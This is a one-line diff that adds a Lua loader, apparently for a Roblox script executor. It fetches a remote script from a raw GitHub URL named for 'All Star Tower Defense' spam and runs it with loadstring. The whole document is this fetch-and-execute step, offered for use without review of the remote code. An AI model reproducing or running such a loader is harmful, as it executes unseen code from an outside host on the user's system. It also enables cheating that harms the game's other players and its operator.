@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/og-all-star-tower-defense-spam2-ecgp2ewho8m4u7.lua"))()
